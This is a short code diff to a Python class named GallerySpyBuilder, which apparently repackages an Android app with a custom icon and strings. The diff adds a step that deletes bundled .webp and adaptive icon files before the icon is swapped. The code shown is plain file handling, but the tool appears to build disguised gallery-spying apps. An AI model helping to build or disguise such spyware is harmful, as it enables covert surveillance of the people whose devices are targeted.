@@ -344,6 +344,30 @@ class GallerySpyBuilder:
             print(f"\r{Colors.YELLOW}[!] Warning: Failed to update strings: {e}{Colors.END}")
             return True
     
+    def clean_icon_conflicts(self):
+        """Remove all .webp icon files to avoid conflicts"""
+        try:
+            densities = ['mdpi', 'hdpi', 'xhdpi', 'xxhdpi', 'xxxhdpi']
+            
+            for density in densities:
+                mipmap_dir = self.work_dir / f"res/mipmap-{density}"
+                if mipmap_dir.exists():
+                    # Remove all .webp files
+                    for webp_file in mipmap_dir.glob("*.webp"):
+                        webp_file.unlink()
+            
+            # Also remove adaptive icon XML to avoid conflicts
+            anydpi_dir = self.work_dir / "res/mipmap-anydpi-v26"
+            if anydpi_dir.exists():
+                for xml_file in anydpi_dir.glob("*.xml"):
+                    xml_file.unlink()
+            
+            return True
+            
+        except Exception as e:
+            print(f"\r{Colors.YELLOW}[!] Warning: Failed to clean icon conflicts: {e}{Colors.END}")
+            return True
+    
     def change_icon(self):
         """Change app icon"""
         if not self.config.get('icon'):
@@ -595,8 +619,14 @@ class GallerySpyBuilder:
             
             print(f"\r{Colors.GREEN}[✓] Configuration applied{Colors.END}" + " " * 30)
             
+            # Always clean icon conflicts (webp files)
+            print(f"{Colors.CYAN}[*] Cleaning icon conflicts...{Colors.END}", end='', flush=True)
+            if not self.clean_icon_conflicts():
+                return
+            print(f"\r{Colors.GREEN}[✓] Icon conflicts cleaned{Colors.END}" + " " * 30)
+            
             if self.config.get('icon'):
-                print(f"{Colors.CYAN}[*] Preparing icon...{Colors.END}", end='', flush=True)
+                print(f"{Colors.CYAN}[*] Changing icon...{Colors.END}", end='', flush=True)
                 if not self.change_icon():
                     return
                 print(f"\r{Colors.GREEN}[✓] Icon changed{Colors.END}" + " " * 30)
